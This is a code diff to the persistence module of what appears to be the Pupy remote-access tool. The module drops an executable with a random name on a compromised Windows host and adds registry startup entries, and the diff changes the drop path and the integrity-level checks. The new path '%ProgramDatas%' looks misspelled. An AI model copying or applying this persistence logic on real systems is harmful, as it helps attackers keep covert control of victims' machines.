@@ -58,7 +58,6 @@ class PersistenceModule(PupyModule):
             self.error('Couldn\'t make service persistent.')
 
     def windows(self, args):
-        # print args.cmd
         
         self.client.load_package("pupwinutils.persistence")
         if args.action=="enable":
@@ -74,7 +73,7 @@ class PersistenceModule(PupyModule):
                     exebuff=f.read()
                 self.info("loading %s ..."%args.exe)
 
-                remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
+                remote_path=self.client.conn.modules['os.path'].expandvars("%ProgramDatas%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
                 
                 # uploading
                 self.info("uploading to %s ..."%remote_path)
@@ -99,7 +98,7 @@ class PersistenceModule(PupyModule):
                 return 
 
             # adding persistency in registry
-            if self.client.desc['intgty_lvl'] != "High":
+            if self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System":
                 self.info("adding to registry ...")
                 if self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(cmd):
                     self.success("persistence added in registry !")
@@ -117,9 +116,8 @@ class PersistenceModule(PupyModule):
         elif args.action=="disable":
             
             # removing persistency from registry
-            if self.client.desc['intgty_lvl'] != "High":
+            if self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System":
                 self.info("removing persistence from registry ...")
-                # print self.client.conn.modules['pupwinutils.persistence'].remove_registry_startup()
                 if self.client.conn.modules['pupwinutils.persistence'].remove_registry_startup():
                     self.info("persistence removed !")
                 else:
